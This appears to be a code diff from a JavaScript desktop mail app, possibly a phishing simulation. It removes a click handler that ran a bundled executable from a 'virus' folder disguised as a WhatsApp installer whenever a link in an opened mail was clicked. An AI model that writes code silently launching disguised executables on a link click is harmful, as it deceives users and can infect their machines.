@@ -246,13 +246,6 @@ async function ouvrirMail(id) {
     // Marquer comme lu
     listMails[id].lu = true
     sauvegarderMail()
-
-    const link = document.querySelector('.lien');
-    link.addEventListener('click', e => {
-        exec('.\\resources\\app\\src\\virus\\WhatsApp_Installer', (error, stdout, stderr) => {
-            console.log(stderr)
-        });
-    })
 }
 
 function fermerMail() {
